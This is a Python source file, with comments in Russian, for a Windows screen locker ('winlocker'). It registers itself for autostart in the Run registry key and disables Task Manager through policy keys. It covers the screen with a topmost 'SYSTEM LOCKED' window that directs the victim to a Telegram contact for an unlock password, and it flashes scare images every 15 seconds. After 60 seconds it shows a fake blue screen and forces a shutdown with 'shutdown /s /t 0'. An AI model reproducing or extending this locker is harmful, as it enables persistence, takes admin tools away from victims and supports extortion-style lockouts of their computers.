import tkinter as tk
import ctypes
from ctypes import wintypes
import sys
import threading
import time
import random
import math
import winsound
import os

# ---- Автозагрузка через реестр ----
def add_to_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, "WindowsLocker", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        print("[+] Программа добавлена в автозагрузку.")
    except Exception as e:
        print(f"[-] Не удалось добавить в автозагрузку: {e}")

# ---- Проверка наличия Pillow ----
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[-] ВНИМАНИЕ: Библиотека Pillow не установлена. Картинки не будут отображаться.")
    print("    Установите: pip install pillow")

# Константы для хуков
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14

keyboard_hook = None
mouse_hook = None
block_input = True

def low_level_keyboard_proc(nCode, wParam, lParam):
    return ctypes.windll.user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

def low_level_mouse_proc(nCode, wParam, lParam):
    return ctypes.windll.user32.CallNextHookEx(mouse_hook, nCode, wParam, lParam)

def set_hooks():
    global keyboard_hook, mouse_hook
    def hook_thread():
        module = ctypes.windll.kernel32.GetModuleHandleW(None)
        keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(low_level_keyboard_proc),
            module,
            0
        )
        mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_MOUSE_LL,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(low_level_mouse_proc),
            module,
            0
        )
        msg = wintypes.MSG()
        while True:
            ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    threading.Thread(target=hook_thread, daemon=True).start()

def block_task_manager(disable=True):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if disable else 0)
        winreg.CloseKey(key)
    except:
        pass

class MatrixRain:
    # (без изменений)
    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.width = width
        self.height = height
        self.chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン"
        self.columns = width // 20
        self.drops = [0] * self.columns
        self.running = True
        self.after_id = None

    def draw(self):
        if not self.running:
            return
        self.canvas.delete("matrix")
        for i in range(self.columns):
            x = i * 20 + 10
            y = self.drops[i] * 20
            char = random.choice(self.chars)
            color = f"#{random.randint(0, 128):02x}{random.randint(150, 255):02x}{random.randint(0, 128):02x}"
            self.canvas.create_text(x, y, text=char, fill=color, font=("Consolas", 14), tags="matrix")
            if random.random() > 0.975:
                self.drops[i] = 0
            else:
                self.drops[i] = (self.drops[i] + 1) % (self.height // 20 + 2)
        self.after_id = self.canvas.after(50, self.draw)

    def stop(self):
        self.running = False
        if self.after_id:
            self.canvas.after_cancel(self.after_id)

class ParticleSystem:
    # (без изменений)
    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.width = width
        self.height = height
        self.particles = []
        self.running = True
        self.after_id = None
        for _ in range(50):
            self.particles.append({
                'x': random.randint(0, width),
                'y': random.randint(0, height),
                'vx': random.uniform(-1, 1),
                'vy': random.uniform(-1, 1),
                'size': random.randint(2, 5),
                'color': f"#{random.randint(0,255):02x}{random.randint(0,255):02x}{255:02x}"
            })

    def update(self):
        if not self.running:
            return
        self.canvas.delete("particles")
        for p in self.particles:
            p['x'] += p['vx']
            p['y'] += p['vy']
            if p['x'] < 0 or p['x'] > self.width:
                p['vx'] *= -1
            if p['y'] < 0 or p['y'] > self.height:
                p['vy'] *= -1
            x, y, size = p['x'], p['y'], p['size']
            self.canvas.create_oval(x-size, y-size, x+size, y+size,
                                    fill=p['color'], outline='', tags="particles")
        self.after_id = self.canvas.after(30, self.update)

    def stop(self):
        self.running = False
        if self.after_id:
            self.canvas.after_cancel(self.after_id)

class NeonText:
    # (без изменений)
    def __init__(self, canvas, text, x, y, font, base_color):
        self.canvas = canvas
        self.text = text
        self.x = x
        self.y = y
        self.font = font
        self.base_color = base_color
        self.phase = 0
        self.tags = "neon"
        self.after_id = None
        self.running = True

    def update(self):
        if not self.running:
            return
        self.phase = (self.phase + 0.1) % (2 * math.pi)
        factor = (math.sin(self.phase) + 1) / 2
        r = int(self.base_color[1:3], 16)
        g = int(self.base_color[3:5], 16)
        b = int(self.base_color[5:7], 16)
        r_new = min(255, int(r + (255 - r) * factor))
        g_new = min(255, int(g + (255 - g) * factor))
        b_new = min(255, int(b + (255 - b) * factor))
        color = f"#{r_new:02x}{g_new:02x}{b_new:02x}"
        self.canvas.delete(self.tags)
        self.canvas.create_text(self.x, self.y, text=self.text, fill=color,
                                font=self.font, tags=self.tags)
        self.after_id = self.canvas.after(50, self.update)

    def stop(self):
        self.running = False
        if self.after_id:
            self.canvas.after_cancel(self.after_id)

class RainbowText:
    # (без изменений)
    def __init__(self, canvas, text, x, y, font, speed=0.1):
        self.canvas = canvas
        self.text = text
        self.x = x
        self.y = y
        self.font = font
        self.speed = speed
        self.hue = 0
        self.tags = "rainbow"
        self.after_id = None
        self.running = True

    def update(self):
        if not self.running:
            return
        self.hue = (self.hue + self.speed) % 360
        r, g, b = self.hsv_to_rgb(self.hue, 1.0, 1.0)
        color = f"#{int(r*255):02x}{int(g*255):02x}{int(b*255):02x}"
        self.canvas.delete(self.tags)
        self.canvas.create_text(self.x, self.y, text=self.text, fill=color,
                                font=self.font, tags=self.tags)
        self.after_id = self.canvas.after(50, self.update)

    def hsv_to_rgb(self, h, s, v):
        h = float(h)
        s = float(s)
        v = float(v)
        h60 = h / 60.0
        h60f = math.floor(h60)
        hi = int(h60f) % 6
        f = h60 - h60f
        p = v * (1 - s)
        q = v * (1 - f * s)
        t = v * (1 - (1 - f) * s)
        if hi == 0: return v, t, p
        if hi == 1: return q, v, p
        if hi == 2: return p, v, t
        if hi == 3: return p, q, v
        if hi == 4: return t, p, v
        if hi == 5: return v, p, q

    def stop(self):
        self.running = False
        if self.after_id:
            self.canvas.after_cancel(self.after_id)

# ---------- Функция скримера с картинкой и звуком ----------
scare_timer = None

def scare(root, entry):
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    sound_path = "moans.wav"
    if os.path.exists(sound_path):
        winsound.PlaySound(sound_path, winsound.SND_ASYNC | winsound.SND_FILENAME)
    else:
        winsound.Beep(2000, 200)

    scare_win = tk.Toplevel(root)
    scare_win.overrideredirect(True)
    scare_win.attributes('-topmost', True)
    scare_win.geometry(f"{screen_width}x{screen_height}+0+0")
    scare_win.configure(bg='black')

    image_loaded = False
    if PIL_AVAILABLE:
        image_path = "jawa.png"
        if os.path.exists(image_path):
            try:
                pil_image = Image.open(image_path)
                pil_image.thumbnail((screen_width, screen_height), Image.LANCZOS)
                photo = ImageTk.PhotoImage(pil_image)
                label = tk.Label(scare_win, image=photo, bg='black')
                label.image = photo
                label.pack(expand=True)
                image_loaded = True
            except Exception as e:
                print(f"[-] Ошибка загрузки изображения: {e}")
        else:
            print("[-] Файл jawa.png не найден, используется текстовая заглушка.")
    else:
        print("[-] Pillow не установлен, используется текстовая заглушка.")

    if not image_loaded:
        label = tk.Label(scare_win, text="БУ!!!", fg='red', bg='black',
                         font=('Arial', 72, 'bold'))
        label.pack(expand=True)

    scare_win.update()

    def close_scare():
        scare_win.destroy()
        entry.focus_set()

    scare_win.after(1000, close_scare)

def start_scare_timer(root, entry):
    global scare_timer
    scare(root, entry)
    scare_timer = root.after(15000, start_scare_timer, root, entry)

def stop_scare_timer(root):
    global scare_timer
    if scare_timer:
        root.after_cancel(scare_timer)
        scare_timer = None

# ---------- Основная функция ----------
def main():
    print("[*] Запуск винлокера Ultimate Edition...")
    add_to_startup()
    block_task_manager(True)

    root = tk.Tk()
    root.title("")
    root.overrideredirect(True)
    root.configure(bg='black')
    root.attributes('-topmost', True)

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width}x{screen_height}+0+0")

    hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)

    root.focus_force()
    root.grab_set()

    set_hooks()

    canvas = tk.Canvas(root, width=screen_width, height=screen_height,
                       highlightthickness=0, bg='black')
    canvas.pack()

    # Анимации
    matrix = MatrixRain(canvas, screen_width, screen_height)
    particles = ParticleSystem(canvas, screen_width, screen_height)
    matrix.draw()
    particles.update()

    # Панель
    panel_width, panel_height = 750, 550  # чуть увеличил для прогресс-бара
    panel_x = (screen_width - panel_width) // 2
    panel_y = (screen_height - panel_height) // 2

    for i in range(5):
        offset = i * 2
        canvas.create_rectangle(panel_x - offset, panel_y - offset,
                                panel_x + panel_width + offset, panel_y + panel_height + offset,
                                outline=f'#00{i*50:02x}ff', width=2, tags='panel_glow')

    canvas.create_rectangle(panel_x, panel_y, panel_x + panel_width, panel_y + panel_height,
                            fill='#0a0a20', outline='#00ffff', width=3, tags='panel')
    canvas.create_rectangle(panel_x+3, panel_y+3, panel_x+panel_width-3, panel_y+panel_height-3,
                            outline='#3366ff', width=1, tags='panel_inner')

    # Неоновый заголовок
    title = NeonText(canvas, "⚠️ СИСТЕМА ЗАБЛОКИРОВАНА ⚠️",
                     screen_width//2, panel_y + 70,
                     ("Consolas", 28, "bold"), "#ff4444")
    title.update()

    # Инфо
    canvas.create_text(screen_width//2, panel_y + 140,
                       text="Для разблокировки введите пароль или свяжитесь с поддержкой:",
                       fill="#aaaaee", font=("Arial", 16), tags='info')

    # Контакт Telegram
    tg = RainbowText(canvas, "@bunnygleb",
                     screen_width//2, panel_y + 190,
                     ("Arial", 26, "bold"), speed=0.5)
    tg.update()

    # Таймер (текст)
    timer_var = tk.StringVar()
    timer_var.set("Осталось: 60 сек")
    timer_label = tk.Label(root, textvariable=timer_var, fg='yellow', bg='#0a0a20',
                           font=('Arial', 16, 'bold'))
    timer_label.place(x=screen_width//2, y=panel_y+250, anchor='center')

    # Прогресс-бар
    progress_width = 400
    progress_height = 20
    progress_x = screen_width//2 - progress_width//2
    progress_y = panel_y + 280
    progress_bg = canvas.create_rectangle(progress_x, progress_y,
                                          progress_x+progress_width, progress_y+progress_height,
                                          fill='#333333', outline='cyan', width=1, tags='progress')
    progress_fill = canvas.create_rectangle(progress_x, progress_y,
                                            progress_x+progress_width, progress_y+progress_height,
                                            fill='#00ffff', outline='', tags='progress_fill')

    # Поле ввода
    entry_bg = '#222244'
    entry_var = tk.StringVar()
    entry_frame = tk.Frame(root, bg='#00ffff', bd=0)
    entry_frame.place(x=screen_width//2-150, y=panel_y+320, width=300, height=50)
    entry = tk.Entry(entry_frame, textvariable=entry_var, show='*',
                     font=("Arial", 20), bd=0, bg=entry_bg, fg='white',
                     insertbackground='cyan', justify='center')
    entry.pack(fill='both', expand=True, padx=2, pady=2)
    entry.focus_set()

    # Кнопка
    def on_enter(e):
        unlock_btn.config(bg='#3366ff')
    def on_leave(e):
        unlock_btn.config(bg='#111133')
    def on_click():
        check_password()

    unlock_btn = tk.Button(root, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 14, "bold"),
                           fg='white', bg='#111133', activebackground='#2244aa',
                           relief='flat', bd=0, padx=20, pady=8, cursor='hand2')
    unlock_btn.place(x=screen_width//2-100, y=panel_y+380, width=200, height=40)
    unlock_btn.bind('<Enter>', on_enter)
    unlock_btn.bind('<Leave>', on_leave)
    unlock_btn.bind('<Button-1>', lambda e: on_click())

    # Статус (для сообщений об ошибках и блокировке)
    status_label = tk.Label(root, text="", fg='#ff8888', bg='#0a0a20',
                            font=("Arial", 12))
    status_label.place(x=screen_width//2, y=panel_y+430, anchor='center')

    # Переменные для таймера, BSOD и счётчика попыток
    time_left = 60
    timer_id = None
    bsod_active = False
    shutdown_timer_id = [None]
    fail_count = 0
    fail_lock_until = 0  # время (в мс от начала?), но проще использовать флаг и root.after

    # Функция выключения компьютера
    def shutdown_computer():
        print("[!] Выключение компьютера...")
        os.system("shutdown /s /t 0")

    # Функция отображения реалистичного BSOD
    def show_bsod():
        nonlocal bsod_active
        bsod_active = True
        # Останавливаем все анимации
        matrix.stop()
        particles.stop()
        title.stop()
        tg.stop()
        # Останавливаем скримеры
        stop_scare_timer(root)
        # Очищаем canvas
        canvas.delete("all")
        # Устанавливаем цвет фона как у современного BSOD
        bsod_bg = '#1073c2'
        root.configure(bg=bsod_bg)
        canvas.configure(bg=bsod_bg)

        # Скрываем старые элементы
        timer_label.place_forget()
        status_label.place_forget()

        # Рисуем элементы BSOD
        center_x = screen_width // 2
        center_y = screen_height // 2

        # Смайлик
        canvas.create_text(center_x, center_y - 180, text=":(", fill='white',
                           font=('Segoe UI', 120, 'bold'), tags='bsod')

        # Основное сообщение об ошибке
        error_text1 = "Your device ran into a problem and needs to restart."
        error_text2 = "We're just collecting some error info, and then we'll restart for you."
        canvas.create_text(center_x, center_y - 40, text=error_text1, fill='white',
                           font=('Segoe UI', 18), tags='bsod')
        canvas.create_text(center_x, center_y - 10, text=error_text2, fill='white',
                           font=('Segoe UI', 18), tags='bsod')

        # Процент завершения (статичный 0%)
        canvas.create_text(center_x, center_y + 40, text="0% complete", fill='white',
                           font=('Segoe UI', 16), tags='bsod')

        # QR-код (имитация)
        qr_size = 100
        qr_x = center_x - qr_size - 50
        qr_y = center_y + 80
        canvas.create_rectangle(qr_x, qr_y, qr_x + qr_size, qr_y + qr_size,
                                fill='white', outline='black', width=2, tags='bsod')
        for i in range(0, qr_size, 10):
            for j in range(0, qr_size, 10):
                if (i // 10 + j // 10) % 3 == 0:
                    canvas.create_rectangle(qr_x + i, qr_y + j, qr_x + i + 5, qr_y + j + 5,
                                            fill='black', outline='', tags='bsod')

        # Код остановки
        stopcode = "STOP_CODE: WINLOCKER_TIMEOUT"
        canvas.create_text(center_x + 50, center_y + 130, text=stopcode, fill='white',
                           font=('Consolas', 16, 'bold'), anchor='w', tags='bsod')

        # Ссылка на поддержку
        support_url = "For more information, visit https://windows.com/stopcode"
        canvas.create_text(center_x, screen_height - 50, text=support_url, fill='white',
                           font=('Segoe UI', 12), tags='bsod')

        # Перемещаем поле ввода и кнопку в нижнюю часть экрана
        entry.place(x=center_x-150, y=screen_height-180, width=300, height=50)
        unlock_btn.place(x=center_x-100, y=screen_height-110, width=200, height=40)
        status_label.place(x=center_x, y=screen_height-60, anchor='center')
        status_label.config(bg=bsod_bg, fg='white')

        # Запускаем таймер на 5 секунд до выключения
        def shutdown_after_5():
            shutdown_computer()

        shutdown_timer_id[0] = root.after(5000, shutdown_after_5)

    # Функция звукового тиканья таймера
    def play_tick(remaining):
        if remaining > 10:
            # Обычный тик
            winsound.Beep(800, 50)
        else:
            # Учащённый высокий тик в последние 10 секунд
            winsound.Beep(1200, 80)

    # Обновление таймера и прогресс-бара
    def update_timer():
        nonlocal time_left, timer_id, bsod_active
        if bsod_active:
            return
        time_left -= 1
        timer_var.set(f"Осталось: {time_left} сек")

        # Обновляем прогресс-бар
        fill_width = int(progress_width * (time_left / 60))
        canvas.coords(progress_fill, progress_x, progress_y, progress_x + fill_width, progress_y + progress_height)

        # Звуковой тик
        play_tick(time_left)

        if time_left <= 0:
            show_bsod()
        else:
            timer_id = root.after(1000, update_timer)

    # Функция анимированных ошибок на фоне
    def random_error_flash():
        if bsod_active or not matrix.running:
            return
        x = random.randint(panel_x + 50, panel_x + panel_width - 50)
        y = random.randint(panel_y + 50, panel_y + panel_height - 50)
        err = canvas.create_text(x, y, text="CRITICAL ERROR", fill='#ff0000',
                                 font=('Arial', random.randint(10, 16)),
                                 tags='error_flash')
        # Делаем полупрозрачным через alpha (не поддерживается в tkinter, поэтому просто удалим через 300 мс)
        canvas.after(300, lambda: canvas.delete(err))
        canvas.after(random.randint(4000, 8000), random_error_flash)

    # Функция дрожания окна при ошибке
    def shake_window():
        nonlocal root
        x, y = root.winfo_x(), root.winfo_y()
        for i in range(5):
            dx = random.randint(-10, 10)
            dy = random.randint(-10, 10)
            root.geometry(f"+{x+dx}+{y+dy}")
            root.update()
            time.sleep(0.02)
        root.geometry(f"+{x}+{y}")

    # Проверка пароля с учётом блокировки после неудач
    def check_password(event=None):
        nonlocal fail_count, fail_lock_until
        if fail_count >= 3:
            # Проверяем, не прошло ли время блокировки
            if fail_lock_until > 0:
                # Блокировка активна
                status_label.config(text="Слишком много попыток. Подождите 10 сек.")
                return
            else:
                fail_count = 0  # сбрасываем после блокировки

        if entry_var.get() == "1234":
            print("[+] Правильный пароль, разблокировка...")
            if shutdown_timer_id[0]:
                root.after_cancel(shutdown_timer_id[0])
            if timer_id:
                root.after_cancel(timer_id)
            stop_scare_timer(root)
            matrix.stop()
            particles.stop()
            title.stop()
            tg.stop()
            block_task_manager(False)
            root.quit()
            root.destroy()
            sys.exit(0)
        else:
            entry_var.set("")
            fail_count += 1
            if fail_count >= 3:
                # Блокируем ввод на 10 секунд
                status_label.config(text="Слишком много попыток. Подождите 10 сек.")
                entry.config(state='disabled')
                unlock_btn.config(state='disabled')
                fail_lock_until = root.after(10000, lambda: release_lock())
            else:
                status_label.config(text="Неверный пароль!")
                # Дрожание окна
                shake_window_thread = threading.Thread(target=shake_window)
                shake_window_thread.start()
            entry.configure(bg='#550000')
            root.after(200, lambda: entry.configure(bg=entry_bg))

    def release_lock():
        nonlocal fail_count, fail_lock_until
        fail_count = 0
        fail_lock_until = 0
        entry.config(state='normal')
        unlock_btn.config(state='normal')
        status_label.config(text="")

    entry.bind('<Return>', check_password)

    # Запуск таймера
    timer_id = root.after(1000, update_timer)

    # Запуск скримеров каждые 15 секунд
    start_scare_timer(root, entry)

    # Запуск случайных ошибок на фоне
    root.after(5000, random_error_flash)

    # Случайные искры
    def sparkles():
        if not matrix.running or bsod_active:
            return
        x = random.randint(panel_x, panel_x+panel_width)
        y = random.randint(panel_y, panel_y+panel_height)
        canvas.create_oval(x-2, y-2, x+2, y+2, fill='cyan', outline='', tags='sparkle')
        canvas.after(20, lambda: canvas.delete('sparkle'))
        canvas.after(random.randint(100, 500), sparkles)
    sparkles()

    print("[+] Основное окно создано, запускаю mainloop.")
    root.mainloop()

if __name__ == "__main__":
    main()